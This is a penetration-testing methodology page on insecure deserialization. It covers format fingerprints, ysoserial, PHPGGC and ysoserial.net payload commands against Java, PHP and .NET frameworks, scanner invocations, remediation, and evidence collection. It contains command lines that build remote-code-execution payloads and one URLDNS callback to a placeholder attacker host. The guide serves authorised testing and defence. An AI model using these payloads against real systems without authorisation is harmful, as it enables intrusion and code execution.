# Insecure Deserialization Testing

## Overview
Insecure deserialization occurs when applications deserialize data from untrusted sources without validation. Attackers can manipulate serialized objects to achieve remote code access, privilege escalation, or authentication bypass.

## Classification
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **OWASP:** A08:2021 - Software and Data Integrity Failures
- **CVSS Base:** 7.5 - 10.0

## Detection Methodology

### 1. Identify Serialization Formats

**Java serialized objects:**
- Magic bytes: `AC ED 00 05` (hex) or `rO0AB` (base64)
- Content-Type: `application/x-java-serialized-object`
- Common in: Cookies, hidden fields, JMX, RMI

**PHP serialized objects:**
- Format: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}`
- Prefixes: `a:` (array), `O:` (object), `s:` (string), `i:` (integer)

**Python serialized data:**
- Magic bytes: `\x80\x03` (protocol 3), `\x80\x04` (protocol 4)
- Base64 encoded in cookies/tokens

**.NET serialized objects:**
- ViewState (`__VIEWSTATE` parameter)
- `AAEAAAD/////` base64 prefix (BinaryFormatter)
- JSON.NET with `$type` discriminator

**Node.js:**
- `node-serialize` with `_$$ND_FUNC$$_` prefix

### 2. Java Deserialization

**Detection with URLDNS (DNS callback, no code path needed):**
```bash
java -jar ysoserial.jar URLDNS "http://callback.attacker.com" | base64
```

**Gadget chains for code path:**
```bash
java -jar ysoserial.jar CommonsCollections1 "id" | base64
java -jar ysoserial.jar CommonsCollections5 "id" | base64
java -jar ysoserial.jar CommonsBeanutils1 "id" | base64
java -jar ysoserial.jar Spring1 "id" | base64
```

### 3. PHP Deserialization

**Magic methods exploited:**
- `__wakeup()` - Called on unserialize()
- `__destruct()` - Called when object is destroyed
- `__toString()` - Called when object used as string

**PHPGGC for known framework chains:**
```bash
phpggc -l                        # List available chains
phpggc Laravel/RCE1 system id    # Laravel
phpggc Symfony/RCE4 system id    # Symfony
phpggc WordPress/RCE1 system id  # WordPress
phpggc Magento/SQLI1 "SELECT 1"  # Magento
```

**POP chain building:**
1. Find `__destruct()` or `__wakeup()` in source
2. Trace method calls to dangerous sinks (file operations, system calls)
3. Build serialized chain reaching the sink

### 4. Python Serialized Data

**Detection:** Look for base64-encoded data in cookies/tokens that decodes to binary with `\x80` prefix.

**Methodology:**
- Analyze the application for deserialization entry points
- Test with modified serialized payloads
- Use class hierarchy manipulation via `__reduce__` method

### 5. .NET Deserialization

**ViewState exploitation:**
```bash
# If ViewState MAC is disabled or key is known
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "whoami"
```

**JSON.NET with TypeNameHandling:**
- Look for `$type` in JSON responses
- Inject type discriminator pointing to dangerous classes

### 6. YAML Deserialization
- Look for YAML parsing endpoints
- Test with type-annotated payloads specific to the YAML library used

## Tool Usage
```bash
# Java - ysoserial
java -jar ysoserial.jar [gadget] "[command]" | base64

# PHP - PHPGGC
phpggc [framework/chain] [function] [argument]

# .NET - ysoserial.net
ysoserial.exe -g [gadget] -f [formatter] -c "[command]"

# Nuclei deserialization templates
nuclei -u http://target.com -t deserialization/ -batch

# Java deserialization scanner
java -jar DeserLab.jar -t target.com -p 8080
```

## Remediation
1. **Avoid deserializing untrusted data** entirely
2. **Use safe serialization formats** - JSON, Protocol Buffers, MessagePack
3. **Integrity checks** - sign serialized data with HMAC
4. **Type whitelisting** - restrict allowed classes during deserialization
5. **Isolate deserialization** - sandbox with minimal privileges
6. **Monitor deserialization** - log and alert on unexpected types
7. **Keep libraries updated** - patch known gadget chains
8. **Use look-ahead deserialization** - validate before full deserialization

## Evidence Collection
- Serialization format identified
- Gadget chain used
- Code path proof (command output)
- Vulnerable endpoint and parameter
- Library/framework versions involved
- Impact assessment
